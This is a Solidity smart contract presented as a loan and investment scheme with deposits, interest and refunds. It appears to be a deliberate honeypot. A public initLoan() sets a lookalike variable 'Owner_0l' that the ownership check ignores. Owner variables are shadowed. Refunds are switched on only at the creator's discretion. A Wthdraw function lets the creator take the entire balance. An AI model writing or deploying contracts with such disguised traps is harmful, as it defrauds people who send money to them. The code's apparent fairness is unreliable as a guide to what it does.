1 pragma solidity ^0.4.16;
2 
3 contract Base 
4 {
5     address Creator = msg.sender;
6     address Owner_01 = msg.sender;
7     address Owner_02;
8     address Owner_03;
9     
10     function add(uint256 x, uint256 y) 
11     internal 
12     returns (uint256) 
13     {
14         uint256 z = x + y;
15         if((z >= x) && (z >= y))
16         {
17           return z;
18         }
19         else
20         {
21             revert();
22         }
23     }
24 
25     function sub(uint256 x, uint256 y) 
26     internal 
27     returns (uint256) 
28     {
29         if(x >= y)
30         {
31            uint256 z = x - y;
32            return z;
33         }
34         else
35         {
36             revert();
37         }
38     }
39 
40     function mul(uint256 x, uint256 y) 
41     internal 
42     returns (uint256) 
43     {
44         uint256 z = x * y;
45         if((x == 0) || (z / x == y))
46         {
47             return z;
48         }
49         else
50         {
51             revert();
52         }
53     }
54     
55     event Deposit(address indexed sender, uint value);
56     
57     event Invest(address indexed sender, uint value);
58     
59     event Refound(address indexed sender, uint value);
60     
61     event Withdraw(address indexed sender, uint value);
62     
63     event Log(string message);
64 }
65 
66 contract Loan is Base
67 {
68     struct Creditor
69     {
70         uint Time;
71         uint Invested;
72     }
73     
74     uint public TotalInvested;
75     uint public Available;
76     uint public InvestorsQty;
77     uint public prcntRate = 1;
78     bool CanRefound;
79     
80     address Owner_0l;
81     address Owner_02;
82     address Owner_03;
83     
84     mapping (address => uint) public Investors;
85     mapping (address => Creditor) public Creditors;
86     
87     function initLoan()
88     {
89         Owner_0l = msg.sender;
90     }
91     
92     function SetScndOwner(address addr) 
93     public 
94     {
95         require((msg.sender == Owner_02)||(msg.sender==Creator));
96         Owner_02 = addr;
97     }
98     
99     function SetThrdOwner(address addr) 
100     public 
101     {
102         require((msg.sender == Owner_02)||(msg.sender==Creator));
103         Owner_03 = addr;
104     }
105     
106     function SetPrcntRate(uint val)
107     public
108     {
109         if(val>=1&&msg.sender==Creator)
110         {
111             prcntRate = val;  
112         }
113     }
114     
115     function StartRefound(bool val)
116     public
117     {
118         if(msg.sender==Creator)
119         { 
120             CanRefound = val;
121         }
122     }
123     
124     function() payable
125     {
126         InvestFund();
127     }
128     
129     function InvestFund() 
130     public
131     payable
132     {
133         if(msg.value>= 1 ether)
134         {
135             if(Investors[msg.sender]==0)InvestorsQty++;
136             Investors[msg.sender]+=msg.value;
137             TotalInvested+=msg.value;
138             Available+=msg.value;
139             Invest(msg.sender,msg.value);
140         }   
141     }
142     
143     function ToLend() 
144     public 
145     payable
146     {
147         Creditors[msg.sender].Time = now;
148         Creditors[msg.sender].Invested += msg.value;
149         Deposit(msg.sender,msg.value);
150     }
151     
152     function CheckProfit(address addr) 
153     public 
154     constant 
155     returns(uint)
156     {
157         return ((Creditors[addr].Invested/100)*prcntRate)*((now-Creditors[addr].Time)/1 days);
158     }
159     
160     function TakeBack() 
161     public 
162     payable
163     {
164         uint profit = CheckProfit(msg.sender);
165         if(profit>0&&CanRefound)
166         {
167             uint summ = Creditors[msg.sender].Invested+profit;
168             Creditors[msg.sender].Invested = 0;
169             msg.sender.transfer(summ);
170             Refound(msg.sender,summ);
171         }
172     }
173     
174     function WithdrawToInvestor(address _addr, uint _wei) 
175     public 
176     payable
177     {
178         if(Investors[_addr]>0)
179         {
180             if(isOwner())
181             {
182                  if(_addr.send(_wei))
183                  {
184                    Available-=_wei;
185                    Withdraw(_addr,_wei);
186                  }
187             }
188         }
189     }
190     
191     function Wthdraw()
192     public
193     payable
194     {
195         if(msg.sender==Creator)
196         {
197             Creator.transfer(this.balance);
198         }
199     }
200     
201     
202     function isOwner()
203     private
204     constant 
205     returns (bool)
206     {
207         return( msg.sender == Owner_01 || msg.sender == Owner_02 || msg.sender == Owner_03);
208     }
209 }